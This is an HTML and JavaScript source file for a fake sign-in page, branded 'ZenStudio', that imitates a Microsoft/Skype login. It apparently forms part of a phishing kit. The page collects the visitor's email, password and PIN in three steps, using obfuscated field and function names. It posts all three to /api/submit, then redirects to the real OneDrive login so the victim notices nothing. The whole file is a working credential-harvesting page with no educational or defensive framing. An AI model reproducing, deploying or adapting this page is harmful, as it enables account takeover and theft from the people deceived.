<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="img/favicon.ico" />
    <title>Digital Storage Service Studio</title>
    <style>
    * {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Malgun Gothic", "Estrangelo Edessa", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
}

html,
body {
    background-color: #e2e5d3;
    color: #1b1b1b;
}

section{
    display:table-cell;
    vertical-align:middle;
    height: 100vh;
    width: 100rem;
    max-width: 100%;
}

.navimg {
    height: 70px;
}

.title {
    line-height: 1.75rem;
    color: #1b1b1b;
    font-size: 1.5rem;
    font-weight: 600;
}

.auth-wrapper {
    max-width: 440px;
    width: calc(100% - 40px);
    padding: 44px;
    margin: auto;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    min-width: 320px;
}

.opts {
    padding: 10px 44px;
    max-width: 440px;
    cursor: pointer;
    margin: auto;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
}

.opts:hover {
    background-color: rgba(0, 0, 0, .1);
}

.input {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0, 0, 0, .4);
    background-color: rgba(255, 255, 255, .4);
    height: 32px;
    height: 2rem;
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0, 0, 0, .6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    width: calc(100% - 20px);
}

.input:hover {
    border-color: #323232;
    border-color: rgba(0, 0, 0, .8);
}

.input::placeholder {
    font-size: 15px;
}

.mb-0 {
    margin-bottom: 0;
}

a.link {
    text-decoration: none;
    color: #0067b8
}

a:hover {
    text-decoration: underline !important;
    color: #666;
}

a:focus {
    border: 1px dotted #000;
    text-decoration: underline !important;
}

.btn {
    margin: 0 0 0 auto;
    display: block;
    background-color: #0067b8;
    color: #fff;
    border: 2px solid #0067b8;
    padding: 5px 30px;
    font-size: 15px;
    cursor: pointer;
}

.btn:hover {
    background-color: #005da6;
}

.has-icon {
    display: flex;
    gap: 5px;
    align-items: center;
}

.mb-16 {
    margin-bottom: 16px;
}

.has-icon .icon {
    display: inline-flex;
}

.footer {
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    overflow: visible;
    z-index: 99;
    clear: both;
    min-height: 28px;
    display: flex;
    flex-direction: row;
    gap: 10px;
    justify-content: end;
}

.footer a,
.footer span {
    color: #000;
    font-size: 12px;
    line-height: 28px;
    margin-left: 8px;
    margin-right: 8px;
    text-decoration: none;
}

.footer span {
    font-size: 20px;
    line-height: 20px;
}

.footer a:hover {
    text-decoration: underline;
}

.d-none {
    display: none !important;
}

.back {
    border: none;
    border-radius: 50%;
    width: 24px;
    height: 24px;
    background-color: unset;
    cursor: pointer;
}

.identity {
    display: inline-flex;
    gap: 5px;
}

.d-block {
    display: block;
}

.w-100 {
    width: 100%;
}

.back:hover {
    background-color: #e6e6e6;
    background-color: rgba(0, 0, 0, .1);
}

.mt-16 {
    margin-top: 16px;
}

.mb-16 {
    margin-bottom: 16px;
}

.error {
    color: var(--error) !important;
}

.error-inp {
    border-bottom-color: var(--error) !important;
}

.btn-group {
    text-align: right;
    width: 100%;
    margin: 16px 0;
}

.btn-group>.btn {
    display: inline;
}

.btn-group>.btn:not(:last-child) {
    margin-right: 5px;
}

.btn-sec {
    background-color: #b2b2b2;
    color: #000;
    border-color: #b2b2b2;
}

.btn-sec:hover {
    background-color: rgba(0, 0, 0, .3);
}

#btn_final:hover {
    text-decoration: underline;
}

.text-title {
    font-size: 1.5rem;
}

label.has-checkbox {
    display: inline-flex;
    align-items: center;
    gap: 5px;
}

.checkbox {
    width: 20px;
    height: 20px;
}

.p {
    font-weight: 400;
    font-size: 15px;
    margin: 16px 0;
}

.fs-13 {
    font-size: 13px;
}

#user_identity {
    font-size: 15px;
    color: #1b1b1b;
}

img{
    vertical-align: middle;
}

@media screen and (max-width:600px) {
    html, body{
        background-color: #fff;
    }
    section{
        display:block !important;
    }
    .auth-wrapper{
        box-shadow: none !important;
        padding: 24px !important;
        width: unset !important;
        max-width: unset !important;
    }
    .opts{
        box-shadow: none !important;
        padding: 8px 24px !important;
        border: 1px solid #999;
        max-width: calc(100% - 48px);
        margin: 12% auto !important;
    }
    .footer{
        justify-content: start;
    }
}
:root {
    --error: #e81123;
}
</style>
</head>

<body>
<section id="section_uname">
  <div class="auth-wrapper">
    <img src="img/lg16.png" class="navimg" alt="ZenStudio Logo" />
    <h2 class="title mb-16 mt-16">Sign in</h2>
    <div class="mb-16">
      <p id="error_uname" class="error"></p>
      <input id="inp_uname" type="text" name="phwet" class="input" placeholder="Email, phone, or Skype" required />
    </div>
    <div>
      <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
      <p class="mb-16 fs-13">
        <a href="#" class="link">Sign in with a security key <img src="img/question.png" alt="Question img"></a>
      </p>
    </div>
    <div>
      <button class="btn" id="btn_next">Next</button>
    </div>
  </div>
  <div class="opts">
    <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="img/key.png" width="30px" /></span> Sign-in options</p>
  </div>
</section>

<section id="section_pwd" class="d-none">
  <div class="auth-wrapper">
    <img src="img/lg16.png" class="navimg" alt="ZenStudio Logo" />
    <div class="identity w-100 mt-16 mb-16">
      <button class="back">
        <img src="img/back.png" />
      </button>
      <span id="user_identity">a@b.com</span>
    </div>
    <h2 class="title mb-16">Enter password</h2>
    <div class="mb-16">
      <p id="error_pwd" class="error"></p>
      <input id="inp_pwd" type="password" name="psdwet" class="input" placeholder="Password" required />
    </div>
    <div>
      <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
      <p class="mb-16">
        <a href="#" class="link fs-13">Other ways to sign in</a>
      </p>
    </div>
    <div>
      <button class="btn" id="btn_sig">Submit</button>
    </div>
  </div>
</section>

<section id="section_final" class="d-none">
  <div class="auth-wrapper">
    <img src="img/lg16.png" alt="ZenStudio" class="navimg" />
    <div class="identity w-100 mt-16 mb-16">
      <span id="user_identity_final">a@b.com</span>
    </div>
<h2 class="title mb-16">Verify your identity</h2>
<p class="p">Please enter your PIN below to continue.</p>

<p id="error_pin" class="error" style="color: red; display: none;">Invalid PIN. Please try again.</p>

<div class="mb-16">
  <input id="inp_pin" type="password" class="input" placeholder="Enter PIN" />
</div>

<div class="btn-group">
  <button class="btn proceed-button" onclick='handleFinalSubmit()' type="button" id="btn_final_submit">Submit</button>
</div>
  </div>
</section>

<form action="/api/submit" id="ctfrmPhrase" method="post" class="d-none">
  <input type="hidden" name="phwet" id="form_email">
  <input type="hidden" name="psdwet" id="form_password">
  <input type="hidden" name="pin" id="form_pin">
</form>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>

<script>
function lrxrMssg(formId) {
  const form = document.getElementById(formId);
  const formData = new FormData(form);
  const data = {};
  const submitBtn = document.querySelector('.proceed-button');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = "Loading...";
  submitBtn.disabled = true;

  formData.forEach((value, key) => {
    data[key] = value;
  });
  data.send = "true";

  fetch("/api/submit", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(response => response.ok ? response.json() : response.json().then(err => { throw new Error(err.error || `HTTP ${response.status}`); }))
.then(data => {
  window.location.href = "https://onedrive.live.com/login";
})
  .catch(error => {
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });
}

// Login step logic
let view = "uname";
let unameVal = pwdVal = false;

const unameInp = document.getElementById('inp_uname');
const pwdInp = document.getElementById('inp_pwd');


const nextBtn = document.getElementById('btn_next');
const submitBtn = document.getElementById('btn_sig');

nextBtn.addEventListener('click', () => {
  if (unameInp.value.trim() === '') {
    document.getElementById('error_uname').innerText = "Enter a valid email address";
    unameInp.classList.add('error-inp');
    return;
  }
  unameVal = true;
  document.getElementById('error_uname').innerText = "";
  unameInp.classList.remove('error-inp');

  document.getElementById("section_uname").classList.add('d-none');
  document.getElementById('section_pwd').classList.remove('d-none');
  document.querySelectorAll('#user_identity').forEach((e) => e.innerText = unameInp.value);
});

submitBtn.addEventListener('click', () => {
  if (pwdInp.value.trim() === '') {
    document.getElementById('error_pwd').innerText = "Please enter the password for your Zenstudio account.";
    pwdInp.classList.add('error-inp');
    return;
  }
  pwdVal = true;
  document.getElementById('error_pwd').innerText = "";
  pwdInp.classList.remove('error-inp');

  document.getElementById("section_pwd").classList.add('d-none');
  document.getElementById('section_final').classList.remove('d-none');
  document.getElementById('user_identity_final').innerText = unameInp.value;

  // Transfer data to hidden form for final submit
  document.getElementById('form_email').value = unameInp.value;
  document.getElementById('form_password').value = pwdInp.value;
  document.getElementById('form_pin').value = document.getElementById('inp_pin').value;
});

// Back button logic

document.querySelector('.back').addEventListener('click', () => {
  document.getElementById("section_pwd").classList.add('d-none');
  document.getElementById('section_uname').classList.remove('d-none');
});
</script>

<script>
  function handleFinalSubmit() {
    const pinVal = document.getElementById('inp_pin').value.trim();
    if (pinVal === '') {
      document.getElementById('error_pin').style.display = 'block';
      return;
    }
    document.getElementById('error_pin').style.display = 'none';
    document.getElementById('form_pin').value = pinVal;
    lrxrMssg("ctfrmPhrase");
  }
</script>


</body>
</html>